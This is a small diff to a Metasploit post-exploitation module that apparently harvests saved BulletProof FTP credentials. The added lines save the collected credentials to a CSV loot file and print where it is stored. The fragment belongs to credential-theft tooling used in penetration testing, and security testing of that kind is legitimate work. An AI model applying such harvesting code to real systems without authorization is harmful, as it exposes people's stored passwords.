@@ -303,6 +303,18 @@ class Metasploit3 < Msf::Post
 
 		print_line("\n" + results + "\n")
 
+		if not @credentials.rows.empty?
+			p = store_loot(
+				'bulletproof.creds',
+				'text/plain',
+				session,
+				@credentials.to_csv,
+				'bulletproof.creds.csv',
+				'BulletProof Credentials'
+			)
+			print_status("Data stored in: #{p.to_s}")
+		end
+
 	end
 
 end
